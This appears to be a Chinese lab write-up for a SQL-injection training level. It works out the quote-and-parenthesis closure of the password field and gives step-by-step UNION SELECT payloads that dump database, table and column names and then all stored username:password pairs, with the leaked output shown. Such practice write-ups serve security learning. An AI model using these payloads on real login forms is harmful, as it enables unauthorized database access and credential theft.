# 确认闭合状态
跟上题一样，使用post方式输入：passwd=Dumb&submit=Submit&uname=Dumb  
正常回显，接下来测试闭合状态

单引号没回显，测试双引号，出现报错信息：  
near '"Dumb"") LIMIT 0,1' at line 1

可以发现是通过双引号和括号的形式闭合的

输入：passwd=Dumb")--+&submit=Submit&uname=Dumb
正常回显


剩下payload与11关一致
 # 查询数据库名
passwd=1") union select database(),2--+&submit=Submit&uname=Dumb

# 查询表名
passwd=1") union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--+&submit=Submit&uname=Dumb

# 查询列名
passwd=1") union select group_concat(column_name),2 from information_schema.columns where table_name='users' and table_schema=database()--+&submit=Submit&uname=Dumb

# 查询值
passwd=1") union select group_concat(username,':',password),2 from users--+&submit=Submit&uname=Dumb

回显：  
Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4  
Your Password:2